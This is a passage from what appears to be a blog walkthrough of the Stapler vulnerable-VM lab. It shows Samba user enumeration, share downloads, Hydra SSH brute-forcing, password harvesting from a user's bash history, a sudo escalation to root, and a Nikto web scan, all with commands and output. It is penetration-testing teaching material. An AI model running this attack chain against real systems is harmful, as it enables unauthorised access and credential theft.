<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -a 192.168.217.141
</span><span class='line'>============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.141    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  print$          Disk      Printer Drivers
</span><span class='line'>  kathy           Disk      Fred, What are we doing here?
</span><span class='line'>  tmp             Disk      All temporary files should be stored here
</span><span class='line'>  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
</span><span class='line'>Reconnecting with SMB1 for workgroup listing.
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------
</span><span class='line'>  WORKGROUP            RED
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.141
</span><span class='line'>//192.168.217.141/print$  Mapping: DENIED, Listing: N/A
</span><span class='line'>//192.168.217.141/kathy   Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/tmp Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/IPC$    [E] Can't understand response:
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
</span><span class='line'>
</span><span class='line'>========================================================================== 
</span><span class='line'>|    Users on 192.168.217.141 via RID cycling (RIDS: 500-550,1000-1050)    |
</span><span class='line'> ========================================================================== 
</span><span class='line'>+] Enumerating users using SID S-1-22-1 and logon username '', password ''
</span><span class='line'>S-1-22-1-1000 Unix User\peter (Local User)
</span><span class='line'>S-1-22-1-1001 Unix User\RNunemaker (Local User)
</span><span class='line'>S-1-22-1-1002 Unix User\ETollefson (Local User)
</span><span class='line'>S-1-22-1-1003 Unix User\DSwanger (Local User)
</span><span class='line'>S-1-22-1-1004 Unix User\AParnell (Local User)
</span><span class='line'>S-1-22-1-1005 Unix User\SHayslett (Local User)
</span><span class='line'>S-1-22-1-1006 Unix User\MBassin (Local User)
</span><span class='line'>S-1-22-1-1007 Unix User\JBare (Local User)
</span><span class='line'>S-1-22-1-1008 Unix User\LSolum (Local User)
</span><span class='line'>S-1-22-1-1009 Unix User\IChadwick (Local User)
</span><span class='line'>S-1-22-1-1010 Unix User\MFrei (Local User)
</span><span class='line'>S-1-22-1-1011 Unix User\SStroud (Local User)
</span><span class='line'>S-1-22-1-1012 Unix User\CCeaser (Local User)
</span><span class='line'>S-1-22-1-1013 Unix User\JKanode (Local User)
</span><span class='line'>S-1-22-1-1014 Unix User\CJoo (Local User)
</span><span class='line'>S-1-22-1-1015 Unix User\Eeth (Local User)
</span><span class='line'>S-1-22-1-1016 Unix User\LSolum2 (Local User)
</span><span class='line'>S-1-22-1-1017 Unix User\JLipps (Local User)
</span><span class='line'>S-1-22-1-1018 Unix User\jamie (Local User)
</span><span class='line'>S-1-22-1-1019 Unix User\Sam (Local User)
</span><span class='line'>S-1-22-1-1020 Unix User\Drew (Local User)
</span><span class='line'>S-1-22-1-1021 Unix User\jess (Local User)
</span><span class='line'>S-1-22-1-1022 Unix User\SHAY (Local User)
</span><span class='line'>S-1-22-1-1023 Unix User\Taylor (Local User)
</span><span class='line'>S-1-22-1-1024 Unix User\mel (Local User)
</span><span class='line'>S-1-22-1-1025 Unix User\kai (Local User)
</span><span class='line'>S-1-22-1-1026 Unix User\zoe (Local User)
</span><span class='line'>S-1-22-1-1027 Unix User\NATHAN (Local User)
</span><span class='line'>S-1-22-1-1028 Unix User\www (Local User)
</span><span class='line'>S-1-22-1-1029 Unix User\elly (Local User)</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a ton of users! I&rsquo;ve proceeded to look at the shares with the guest/guest combination:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient //192.168.217.141/kathy -U guest
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter WORKGROUP\guest's password: 
</span><span class='line'>Try "help" to get a list of possible commands.
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>  .                                   D        0  Fri Jun  3 12:52:52 2016
</span><span class='line'>  ..                                  D        0  Mon Jun  6 17:39:56 2016
</span><span class='line'>  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
</span><span class='line'>  backup                              D        0  Sun Jun  5 11:04:14 2016
</span><span class='line'>
</span><span class='line'>      19478204 blocks of size 1024. 16396296 blocks available</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve looked on the net how to download entire folders and then did just that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; tarmode
</span><span class='line'>tar:316  tarmode is now full, system, hidden, noreset, quiet
</span><span class='line'>smb: \&gt; recurse
</span><span class='line'>smb: \&gt; prompt
</span><span class='line'>smb: \&gt; mget kathy_stuff\
</span><span class='line'>NT_STATUS_OBJECT_NAME_INVALID listing \kathy_stuff\
</span><span class='line'>smb: \&gt; mget kathy_stuff
</span><span class='line'>getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
</span><span class='line'>smb: \&gt; backup
</span><span class='line'>smb: \&gt; mget backup
</span><span class='line'>getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (176.4 KiloBytes/sec) (average 43.9 KiloBytes/sec)
</span><span class='line'>getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (14224.9 KiloBytes/sec) (average 10879.4 KiloBytes/sec)</span></code></pre></td></tr></table></div></figure>


<p>The sequence of commands for downloading folders with smbclient and their description is below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; ? tarmode
</span><span class='line'>HELP tarmode:
</span><span class='line'>  &lt;full|inc|reset|noreset&gt; tar's behaviour towards archive bits
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? recurse
</span><span class='line'>HELP recurse:
</span><span class='line'>  toggle directory recursion for mget and mput
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? prompt
</span><span class='line'>HELP prompt:
</span><span class='line'>  toggle prompting for filenames for mget and mput
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? mget
</span><span class='line'>HELP mget:
</span><span class='line'>  &lt;mask&gt; get all the matching files</span></code></pre></td></tr></table></div></figure>


<p>Next I looked at the tmp share but it was empty. So it&rsquo;s time to see what we&rsquo;ve got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/kathy_stuff# ls
</span><span class='line'>todo-list.txt
</span><span class='line'>root@kali:~/kathy_stuff# cat todo-list.txt 
</span><span class='line'>I'm making sure to backup anything important for Initech, Kathy</span></code></pre></td></tr></table></div></figure>


<p>Well then, something interesting has to be inside the backup folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/backup# ls
</span><span class='line'>vsftpd.conf  wordpress-4.tar.gz</span></code></pre></td></tr></table></div></figure>


<p>The config file for vsftpd and a Wordpress backup! I tried grep&#8217;ing for passwords and looked over the config file, but nothing overly obvious, so again I left these for later in case nothing else works out. For now, I thought about trying my luck again on SSH with the new users. First I put the output from the Samba enumeration in a file and then I selected only the username part and put it in the users file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat userlist | cut -d'\' -f2 | cut -d' ' -f1 &gt; users
</span><span class='line'>cat users
</span><span class='line'>peter
</span><span class='line'>RNunemaker
</span><span class='line'>ETollefson
</span><span class='line'>DSwanger
</span><span class='line'>AParnell
</span><span class='line'>SHayslett
</span><span class='line'>MBassin
</span><span class='line'>JBare
</span><span class='line'>LSolum
</span><span class='line'>IChadwick
</span><span class='line'>MFrei
</span><span class='line'>SStroud
</span><span class='line'>CCeaser
</span><span class='line'>JKanode
</span><span class='line'>CJoo
</span><span class='line'>Eeth
</span><span class='line'>LSolum2
</span><span class='line'>JLipps
</span><span class='line'>jamie
</span><span class='line'>Sam
</span><span class='line'>Drew
</span><span class='line'>jess
</span><span class='line'>SHAY
</span><span class='line'>Taylor
</span><span class='line'>mel
</span><span class='line'>kai
</span><span class='line'>zoe
</span><span class='line'>NATHAN
</span><span class='line'>www
</span><span class='line'>elly</span></code></pre></td></tr></table></div></figure>


<p>There has to be a reason for the ease of enumerating all these users, so I used the file to bruteforce the SSH login, to have something going while working on other services. I used Hydra with the <em>nsr</em> flag for additional checks of &ldquo;n&rdquo; for null password, &ldquo;s&rdquo; try login as pass, &ldquo;r&rdquo; try the reverse login as pass. And I got something super fast!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L users -e nsr 192.168.217.141 ssh
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-02 07:49:25
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
</span><span class='line'>[DATA] attacking ssh://192.168.217.141:22/
</span><span class='line'>[22][ssh] host: 192.168.217.141   login: SHayslett   password: SHayslett
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-02 07:50:11</span></code></pre></td></tr></table></div></figure>


<p>Woohoo, a user we can log in with!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh SHayslett@192.168.217.141
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'>~          Barry, don't forget to put a message here           ~
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'>SHayslett@192.168.217.141's password: 
</span><span class='line'>Welcome back!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SHayslett@red:~$ </span></code></pre></td></tr></table></div></figure>


<p>I did some enumeration. In the web directory I found another hidden message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ cat /var/www/https/announcements/message.txt 
</span><span class='line'>Abby, we need to link the folder somewhere! Hidden at the mo</span></code></pre></td></tr></table></div></figure>


<p>Inside the /srv folder I noticed a tftp directory, so I checked if TFTP is running, and it was:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnp | grep 69
</span><span class='line'>(Not all processes could be identified, non-owned process info
</span><span class='line'> will not be shown, you would have to be root to see it all.)
</span><span class='line'>udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
</span><span class='line'>unix  2      [ ACC ]     STREAM     LISTENING     16924    -                   /var/run/samba/nmbd/unexpected</span></code></pre></td></tr></table></div></figure>


<p>I made a note of this and continued looking. In the Wordpress files I found the MySQL credentials inside the <code>wp-config.php</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/** The name of the database for WordPress */
</span><span class='line'>define('DB_NAME', 'wordpress');
</span><span class='line'>
</span><span class='line'>/** MySQL database username */
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>
</span><span class='line'>/** MySQL database password */
</span><span class='line'>define('DB_PASSWORD', 'plbkac');
</span><span class='line'>
</span><span class='line'>/** MySQL hostname */
</span><span class='line'>define('DB_HOST', 'localhost');</span></code></pre></td></tr></table></div></figure>


<p>On this system there are loads of home directories:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /home
</span><span class='line'>AParnell  DSwanger    IChadwick  JKanode  LSolum2  NATHAN      SHAY       www
</span><span class='line'>CCeaser   Eeth        jamie      JLipps   MBassin  peter       SHayslett  zoe
</span><span class='line'>CJoo      elly        JBare      kai      mel      RNunemaker  SStroud
</span><span class='line'>Drew      ETollefson  jess       LSolum   MFrei    Sam         Taylor</span></code></pre></td></tr></table></div></figure>


<p>I was able to list the contents of the home folders and one of them stood out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -alh -R /home
</span><span class='line'>/home/peter:
</span><span class='line'>total 72K
</span><span class='line'>drwxr-xr-x  3 peter peter 4.0K Jun  3  2016 .
</span><span class='line'>drwxr-xr-x 32 root  root  4.0K Jun  4  2016 ..
</span><span class='line'>-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 peter peter  220 Jun  3  2016 .bash_logout
</span><span class='line'>-rw-r--r--  1 peter peter 3.7K Jun  3  2016 .bashrc
</span><span class='line'>drwx------  2 peter peter 4.0K Jun  6  2016 .cache
</span><span class='line'>-rw-r--r--  1 peter peter  675 Jun  3  2016 .profile
</span><span class='line'>-rw-r--r--  1 peter peter    0 Jun  3  2016 .sudo_as_admin_successful
</span><span class='line'>-rw-------  1 peter peter  577 Jun  3  2016 .viminfo
</span><span class='line'>-rw-rw-r--  1 peter peter  39K Jun  3  2016 .zcompdump
</span><span class='line'>ls: cannot open directory '/home/peter/.cache': Permission denied</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s interesting, but there&rsquo;s nothing in that file. I&rsquo;ve looked randomly in the <em>.bash_history</em> of some users and saw there were 1-2 lines of irrelevant commands like exit, top. I decided to list all the history files and see if there are discrepancies in their size:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ ls -alh -R /home | grep '.bash_history'
</span><span class='line'>-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root    16 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root     10 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root      12 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
</span><span class='line'>ls: cannot open directory '/home/peter/.cache': Permission denied
</span><span class='line'>-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      8 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    9 Jun  5  2016 .bash_history</span></code></pre></td></tr></table></div></figure>


<p>Woot, JKanode&rsquo;s history is 167 bytes long!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ cat /home/JKanode/.bash_history 
</span><span class='line'>id
</span><span class='line'>whoami
</span><span class='line'>ls -lah
</span><span class='line'>pwd
</span><span class='line'>ps aux
</span><span class='line'>sshpass -p thisimypassword ssh JKanode@localhost
</span><span class='line'>apt-get install sshpass
</span><span class='line'>sshpass -p JZQuyIN5 peter@localhost
</span><span class='line'>ps -ef
</span><span class='line'>top
</span><span class='line'>kill -9 3747
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>Inside we have JKanode and peter&rsquo;s passwords! I SSH&#8217;ed as peter and checked the sudo rights:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>red% whoami
</span><span class='line'>peter
</span><span class='line'>red% sudo -l
</span><span class='line'>
</span><span class='line'>We trust you have received the usual lecture from the local System
</span><span class='line'>Administrator. It usually boils down to these three things:
</span><span class='line'>
</span><span class='line'>    #1) Respect the privacy of others.
</span><span class='line'>    #2) Think before you type.
</span><span class='line'>    #3) With great power comes great responsibility.
</span><span class='line'>
</span><span class='line'>[sudo] password for peter: 
</span><span class='line'>Matching Defaults entries for peter on red:
</span><span class='line'>    lecture=always, env_reset, mail_badpass,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User peter may run the following commands on red:
</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>User peter has unlimited access on the machine! We can become root now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>red% sudo su
</span><span class='line'>➜  peter ls /root
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>➜  peter cat /root/flag.txt 
</span><span class='line'>~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
</span><span class='line'>                          .-'''''-.
</span><span class='line'>                          |'-----'|
</span><span class='line'>                          |-.....-|
</span><span class='line'>                          |       |
</span><span class='line'>                          |       |
</span><span class='line'>         _,._             |       |
</span><span class='line'>    __.o`   o`"-.         |       |
</span><span class='line'> .-O o `"-.o   O )_,._    |       |
</span><span class='line'>( o   O  o )--.-"`O   o"-.`'-----'`
</span><span class='line'> '--------'  (   o  O    o)  
</span><span class='line'>              `----------`
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b
</span></code></pre></td></tr></table></div></figure>


<h2>Web server on port 12380</h2>

<p>We&rsquo;ve accomplished the objective, but this is not over! Remember, there are multiple ways of getting shells.</p>

<p><img class="center" src="/images/pentest/stapler/stapler-site.png" title="stapler" alt="webpage"></p>

<p>A hastily built website and left unfinished is bound to have something..maybe in the source code?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! --&gt;
</span><span class='line'>&lt;!--    Change the image source '/images/default.jpg' with your favourite image.     --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Hmm, let&rsquo;s probe further:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h 192.168.217.141:12380
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.141
</span><span class='line'>+ Target Hostname:    192.168.217.141
</span><span class='line'>+ Target Port:        12380
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
</span><span class='line'>                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
</span><span class='line'>                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
</span><span class='line'>+ Start Time:         2018-06-01 06:46:45 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
</span><span class='line'>+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
</span><span class='line'>+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
</span><span class='line'>+ "robots.txt" contains 2 entries which should be manually viewed.
</span><span class='line'>+ Hostname '192.168.217.141' does not match certificate's names: Red.Initech
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ Uncommon header 'x-ob_mode' found, with contents: 1
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found</span></code></pre></td></tr></table></div></figure>


